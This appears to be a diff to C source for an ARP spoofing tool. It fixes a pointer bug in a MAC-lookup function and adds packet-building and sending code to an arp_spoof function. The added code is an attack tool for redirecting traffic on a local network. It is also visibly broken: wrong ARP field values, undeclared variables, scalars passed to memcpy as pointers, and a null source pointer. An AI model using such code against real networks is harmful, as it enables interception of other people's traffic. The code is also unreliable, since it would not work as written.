@@ -66,17 +66,17 @@ int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, con
 
 uint8_t *get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname) {
     
-    struct arp_header *arp_hdr;
-    arp_hdr->hardware_type = htons(1);
-    arp_hdr->protocol_type = htons(0x0800);
-    arp_hdr->hardware_size = 6;
-    arp_hdr->protocol_size = 4;
-    arp_hdr->opcode = htons(ARP_REQUEST);         // ARP_REQUEST = 1, ARP_REPLY = 2
+    struct arp_header arp_hdr;
+    arp_hdr.hardware_type = htons(1);
+    arp_hdr.protocol_type = htons(0x0800);
+    arp_hdr.hardware_size = 6;
+    arp_hdr.protocol_size = 4;
+    arp_hdr.opcode = htons(ARP_REQUEST);         // ARP_REQUEST = 1, ARP_REPLY = 2
     
-    memcpy(arp_hdr->sha, own_mac, 6);
-    memcpy(arp_hdr->spa, &own_ip, 4);
-    memcpy(arp_hdr->tha, 0, 6);
-    memcpy(arp_hdr->tpa, &target_ip, 4);
+    memcpy(arp_hdr.sha, own_mac, 6);
+    memcpy(arp_hdr.spa, &own_ip, 4);
+    memcpy(arp_hdr.tha, 0, 6);
+    memcpy(arp_hdr.tpa, &target_ip, 4);
     
     struct sockaddr_ll dest_addr = {0};
     dest_addr.sll_family = AF_PACKET;
@@ -122,6 +122,32 @@ uint8_t *get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, cha
 
 void arp_spoof(uint32_t ip_target, uint32_t ip_spoof) { 
     
+    struct ethernet_header *eth_hdr = malloc(sizeof(struct ethernet_header));
+    struct arp_header *arp_hdr = malloc(sizeof(struct arp_header));
+    
+    // Make arp packet 
+    arp_hdr->hardware_type = htons(1);
+    arp_hdr->protocol_type = htons(1);
+    arp_hdr->hardware_size = htons(1);
+    arp_hdr->protocol_size = htons(1);
+    arp_hdr->opcode = htons(1);
+    
+    memcpy(arp_hdr->sha, src_mac, 6);
+    memcpy(arp_hdr->spa, src_ip, 4);
+    memcpy(arp_hdr->tha, target_mac, 6);
+    memcpy(arp_hdr->tpa, ip_target, 4);
+    
+    // Make ethernet packet 
+    memcpy(eth_hdr->daddr, target_mac, 6);
+    memcpy(eth_hdr->saddr, src_mac, 6);
+    
+    eth_hdr->ether_type = AF_INET; 
+   
+    if ((sendto(sd, ethernet_packet, sizeof(struct arp_header) + sizeof(struct ethernet_header), 0,
+                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
+        perror("Error in sendto(): ");
+        exit(1);
+    }
     uint32_t ip_send = ip_target;
 
 }
